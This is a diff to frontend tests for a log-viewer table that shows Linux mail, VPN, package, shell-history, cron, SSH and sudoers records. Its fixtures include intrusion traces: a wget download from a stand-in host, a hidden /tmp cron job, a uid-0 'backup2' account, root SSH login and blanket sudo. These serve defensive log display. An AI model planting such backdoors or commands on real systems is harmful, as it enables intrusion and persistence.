@@ -122,8 +122,12 @@ describe("Linux log tables: mail server", () => {
 
   it("shows who tried which account from where, with the original line", () => {
     render(<EventTable items={[failed]} view="network" />);
-    for (const name of [/Service/, /^Action/, /Client IP/, /^User/, /Sender/, /Recipient/, /Status/, /Queue ID/, /Message/]) {
+    for (const name of [/Service/, /^Action/, /Client IP/, /^User/, /Message/]) {
       expect(screen.getAllByRole("columnheader", { name }).length).toBeGreaterThan(0);
+    }
+    // A login has no sender, recipient or queue: those columns are empty on the page and hidden.
+    for (const name of [/Sender/, /Recipient/, /Queue ID/]) {
+      expect(screen.queryByRole("columnheader", { name })).not.toBeInTheDocument();
     }
     expect(screen.getByText("Login failed")).toBeInTheDocument();
     expect(screen.getByText("203.0.113.9")).toBeInTheDocument();
@@ -371,5 +375,44 @@ describe("Linux log tables: VPN", () => {
       fireEvent.click(screen.getByRole("button", { name: `Filter by ${label}` }));
       expect(onFilterField).toHaveBeenCalledWith(field, value);
     }
+  });
+});
+
+describe("Linux configuration and history tables", () => {
+  const base = (type: string, eventType: string, raw: Record<string, unknown>, extra: Record<string, unknown> = {}) =>
+    row(type, { event: { type: eventType, severity: "info", message: "line" }, message: "line", raw, ...extra });
+
+  it.each([
+    ["linux_packages", "dpkg_log", { action: "install", package: "netcat-traditional:i386", version: "1.10-40" }, [/^Action/, /^Package/, /^Version/], "netcat-traditional:i386"],
+    ["linux_shell_history", "bash_history", { username: "admin", shell_type: "bash", command: "wget http://example.invalid/x" }, [/^User/, /^Shell/, /^Command/], "wget http://example.invalid/x"],
+    ["linux_identity", "passwd", { username: "backup2", uid: 0, gid: 0, home: "/root", shell: "/bin/bash" }, [/^Name/, /^UID/, /^Home/, /^Shell/], "backup2"],
+    ["linux_cron", "crontab", { schedule: "*/5 * * * *", username: "www-data", command: "/tmp/.x/run" }, [/^Schedule/, /^Command/], "*/5 * * * *"],
+    ["linux_ssh", "sshd_config", { option: "PermitRootLogin", value: "yes" }, [/^Option/, /^Value/], "PermitRootLogin"],
+    ["linux_sudoers", "sudoers", { principal: "deploy", host_spec: "ALL", run_as: "ALL", command_spec: "ALL" }, [/User \/ Group/, /Run As/, /^Commands/], "deploy"],
+  ])("%s gets a table of its own fields", (type, eventType, raw, headers, value) => {
+    render(<EventTable items={[base(type as string, eventType as string, raw as Record<string, unknown>)]} view="auto" />);
+    for (const name of headers as RegExp[]) expect(screen.getByRole("columnheader", { name })).toBeInTheDocument();
+    expect(screen.getByText(value as string)).toBeInTheDocument();
+    // Columns of another platform's layout (Windows task or prefetch fields) are not shown.
+    expect(screen.queryByRole("columnheader", { name: /Task Path|Run count|User Agent/ })).not.toBeInTheDocument();
+  });
+
+  it("hosts-file entries get IP and names; other network rows keep their own table", () => {
+    render(<EventTable items={[row("network", { event: { type: "hosts_entry", message: "m" }, raw: { IP: "10.0.0.5", HostName: "intranet" } })]} view="network" />);
+    expect(screen.getByRole("columnheader", { name: /IP Address/ })).toBeInTheDocument();
+    expect(screen.getByText("intranet")).toBeInTheDocument();
+  });
+});
+
+describe("Empty columns", () => {
+  it("are hidden until asked for, and the message stays", () => {
+    const item = row("linux_database", { event: { type: "mysql_error", action: "db_log", severity: "info", message: "Plugin disabled" }, message: "Plugin disabled", linux: { db_engine: "mysql" } });
+    render(<EventTable items={[item]} view="network" />);
+    expect(screen.queryByRole("columnheader", { name: /Client IP/ })).not.toBeInTheDocument();
+    expect(screen.getByRole("columnheader", { name: /Message/ })).toBeInTheDocument();
+    fireEvent.click(screen.getByRole("button", { name: "Columns" }));
+    expect(screen.getAllByText("Empty on this page").length).toBeGreaterThan(0);
+    fireEvent.click(screen.getByRole("checkbox", { name: "Show column Client IP" }));
+    expect(screen.getByRole("columnheader", { name: /Client IP/ })).toBeInTheDocument();
   });
 });
